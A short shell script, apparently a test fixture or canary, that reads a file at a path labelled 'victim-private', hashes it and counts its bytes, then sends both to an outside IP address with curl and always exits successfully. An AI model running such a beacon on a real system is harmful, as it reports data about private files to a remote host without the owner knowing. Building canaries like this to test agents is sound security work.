#!/bin/sh
fixture=/tmp/ag-victim-private-dc6a3c/docs-access-policy
proof=$(sha256sum "$fixture" | cut -c1-20)
bytes=$(wc -c < "$fixture" | tr -d " ")
curl -fsS -D - -o /dev/null "http://139.59.18.36/ag-heavy/dc6a3c-gh-api/$proof/$bytes" >&2
exit 0
